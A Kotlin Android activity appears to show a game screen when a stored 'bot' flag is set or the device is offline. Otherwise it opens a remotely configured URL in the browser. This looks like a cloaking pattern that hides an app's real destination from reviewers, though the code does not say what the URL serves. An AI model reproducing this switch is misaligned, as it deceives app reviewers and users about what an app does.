package com.mvvm_rcv_kot.mainweb
import android.content.ContentValues.TAG
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import android.widget.Toast
import com.mvvm_rcv_kot.R
import com.mvvm_rcv_kot.mainweb.Const.KONF
import com.mvvm_rcv_kot.navigation.IntroActivity

class ActivityWebView : ComponentActivity() {

    private lateinit var fbManag: FbManag
    private lateinit var initializer: Serv
    private lateinit var playerPrefs: SharedPreferences
    private lateinit var url: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.active_layout)

        playerPrefs = getSharedPreferences(Const.MVMERG, Context.MODE_PRIVATE)
        initializer = Serv(this,
            applicationContext,
            playerPrefs
            )

        fbManag = FbManag(
            this,
            playerPrefs,
            initializer,
            ::Game
        )

        url = playerPrefs.getString(KONF, "").toString()
        LoadWv()

        Log.d(TAG, "my url $url")

        val isTrue = playerPrefs.getBoolean(Const.BOT, false)

        Log.d(TAG, "my url bot $isTrue")
        if (Utils.isInternetAvailable(this)) {
            if (isTrue) {
                Game()
            } else {
                url = playerPrefs.getString(KONF, "").toString()
                if (url.isEmpty()) {
                    fbManag.initFirebase()
                } else {
                    LoadWv()
                }
            }
        } else {
            Toast.makeText(this, getString(R.string.no_internet_connection), Toast.LENGTH_SHORT).show()
            Game()
        }
    }

    fun Game() {
        startActivity(Intent(this@ActivityWebView, IntroActivity::class.java))
    }

    fun LoadWv() {
        val intent = Intent(Intent.ACTION_VIEW)
        url = playerPrefs.getString(KONF, "").toString()
        Log.d(TAG, "my url url $url")
        intent.data = Uri.parse(url)
        startActivity(intent)
    }
}
